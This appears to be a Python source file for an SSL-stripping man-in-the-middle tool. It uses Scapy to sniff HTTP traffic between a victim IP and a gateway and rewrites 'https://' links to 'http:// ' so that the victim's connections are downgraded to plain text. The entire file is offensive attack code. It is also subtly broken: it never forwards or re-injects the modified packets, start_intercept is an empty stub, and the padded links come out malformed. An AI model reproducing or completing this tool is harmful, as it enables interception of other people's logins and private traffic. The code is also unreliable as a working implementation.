from dataclasses import dataclass
from typing import Optional
import scapy.all as scapy
import re
import sys

@dataclass
class SSLStripConfig:
    iface: str
    victim_ip: Optional[str]
    gateway_ip: Optional[str]
    listen_port: int
    mode: str
    log_file: Optional[str]

def run_ssl_strip(config: SSLStripConfig) -> None:
    """Main entrypoint for SSL stripping capability."""
    print(f"[*] Starting SSL Strip on {config.iface}")
    print(f"[*] Victim: {config.victim_ip} <-> Gateway: {config.gateway_ip}")
    
    start_intercept(config)
    
    # Filter for TCP traffic on port 80 involving our target
    bpf_filter = f"tcp port 80 and (host {config.victim_ip} or host {config.gateway_ip})"
    
    try:
        scapy.sniff(
            iface=config.iface,
            filter=bpf_filter,
            prn=lambda pkt: process_packet(pkt, config),
            store=0
        )
    except KeyboardInterrupt:
        stop_intercept()

def start_intercept(config: SSLStripConfig) -> None:
    """Start the interception pipeline required by the capability."""
    # In a full implementation, we might enable IP forwarding here 
    # or set up iptables rules. For this Scapy implementation, 
    # we assume manual forwarding in process_packet.
    print("[*] Interception started. Press Ctrl+C to stop.")

def stop_intercept() -> None:
    """Stop interception / restore state."""
    print("\n[*] Stopping SSL Strip...")
    sys.exit(0)

def process_packet(pkt, config: SSLStripConfig) -> None:
    """Packet handler used by sniffing/forwarding pipeline."""
    if not pkt.haslayer(scapy.TCP) or not pkt.haslayer(scapy.Raw):
        return

    payload = pkt[scapy.Raw].load
    
    # Check if it's HTTP traffic
    if b"GET " in payload or b"POST " in payload or b"HTTP/1.1" in payload:
        modified_payload = rewrite_http_payload(payload)
        
        if modified_payload != payload:
            print(f"[+] Stripped SSL from packet: {pkt.summary()}")
            pkt[scapy.Raw].load = modified_payload
            # Recalculate checksums so the packet is valid
            del pkt[scapy.IP].len
            del pkt[scapy.IP].chksum
            del pkt[scapy.TCP].chksum

    # Note: In a real MITM scenario with Scapy, you must manually forward 
    # the packet if kernel IP forwarding is disabled, or drop & resend 
    # if using NFQueue. For this skeleton, we assume we modify in place.

def rewrite_http_payload(raw_payload: bytes) -> bytes:
    """Core transformation stage (rewriting logic lives here)."""
    # Simple regex to replace https:// with http://
    # We pad with a space to maintain content length and avoid breaking TCP streams
    # https:// -> http:// 
    # (8 chars)   (7 chars + space)
    
    return re.sub(b'https://', b'http:// ', raw_payload, flags=re.IGNORECASE)
